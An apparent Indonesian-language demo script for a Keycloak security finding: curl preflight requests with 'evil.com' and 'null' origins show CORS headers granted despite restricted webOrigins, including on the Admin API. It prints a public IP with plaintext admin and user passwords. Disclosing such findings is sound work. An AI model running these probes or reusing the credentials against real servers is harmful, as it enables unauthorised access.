# Tutorial: Finding #1 — CORS OPTIONS Preflight Bypass

**Severity:** MEDIUM (CVSS 5.3)
**Waktu demo:** ~5 menit
**Kebutuhan:** Terminal + Browser (Keycloak Admin Console)

---

## Langkah 0: Pastikan Keycloak Berjalan

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```
Output yang diharapkan: `Keycloak OK: test`

---

## Langkah 1: Login ke Admin Console — Tunjukkan webOrigins Config

### 1a. Buka browser, akses Admin Console:
```
http://46.101.162.187:8080/admin/master/console/
```

### 1b. Login dengan kredensial admin:
```
Username: admin
Password: Admin1234
```

### 1c. Navigasi ke konfigurasi client:
1. Klik **"test"** di dropdown realm (kiri atas)
2. Klik **Clients** di sidebar kiri
3. Klik client **"webapp"**
4. Scroll ke bawah, cari bagian **"Web origins"**
5. **Screenshot/tunjukkan** bahwa nilainya: `https://legitimate-app.com`

> **Poin penting:** Admin sudah konfigurasi webOrigins dengan benar — hanya `https://legitimate-app.com` yang seharusnya diizinkan.

---

## Langkah 2: Verifikasi webOrigins via CLI (Opsional)

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s "http://localhost:8080/admin/realms/test/clients?clientId=webapp" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -c "import sys,json; print('webOrigins:', json.load(sys.stdin)[0]['webOrigins'])"
```
Output: `webOrigins: ['https://legitimate-app.com']`

---

## Langkah 3: Kirim OPTIONS Preflight dari evil.com

Ini mensimulasikan browser di `evil.com` yang mengirim preflight check ke Keycloak.

```bash
curl -si -X OPTIONS \
  http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type,Authorization"
```

**Yang diharapkan (aman):** Tidak ada header `Access-Control-Allow-Origin`
**Yang terjadi (VULNERABLE):**
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com        <-- SEHARUSNYA TIDAK ADA!
Access-Control-Allow-Credentials: true               <-- BAHAYA!
Access-Control-Allow-Methods: DELETE, POST, GET, PUT
```

> **evil.com diizinkan padahal TIDAK ada di webOrigins!**

---

## Langkah 4: Test null Origin (Sandboxed Iframe Attack)

```bash
curl -si -X OPTIONS \
  http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: null" \
  -H "Access-Control-Request-Method: POST"
```

**Output (VULNERABLE):**
```
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

> Origin `null` juga diterima — ini berarti serangan dari `<iframe sandbox>`, `file://`, atau `data:` URI bisa bypass semua restricsi.

---

## Langkah 5: Test Admin API Preflight

```bash
curl -si -X OPTIONS \
  http://46.101.162.187:8080/admin/realms/test/users \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Authorization,Content-Type"
```

**Output (VULNERABLE):**
```
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: DELETE, POST, GET, PUT
```

> Bahkan Admin API pun preflight-nya bypass — attacker bisa kirim write request (create user, delete client) dari evil.com!

---

## Langkah 6: Control Test — Actual POST (Ini yang benar)

```bash
curl -si -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -H "Origin: https://evil.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=webapp&username=testuser&password=Password123&scope=openid"
```

**Output:**
```
HTTP/1.1 200 OK
Cache-Control: no-store
Content-Type: application/json
```
> **Perhatikan:** TIDAK ada `Access-Control-Allow-Origin` di response aktual — browser akan block pembacaan response. Tapi server tetap memproses request-nya (write-CSRF tetap terjadi).

---

## Langkah 7: Jalankan Python PoC (Otomatis Semua)

```bash
python3 pocs/poc_f1_cors_bypass.py --host http://localhost:8080
```

---

## Ringkasan

| Test | Expected | Actual | Status |
|---|---|---|---|
| OPTIONS dari evil.com | No ACAO header | `ACAO: https://evil.com` | VULNERABLE |
| OPTIONS dari null | No ACAO header | `ACAO: null` | VULNERABLE |
| OPTIONS Admin API | No ACAO header | `ACAO: https://evil.com` | VULNERABLE |
| Actual POST | No ACAO header | No ACAO header | Correct (tapi server tetap proses) |

**Kesimpulan:** webOrigins per-client TIDAK punya efek pada OPTIONS preflight — semua origin bisa lolos preflight check.
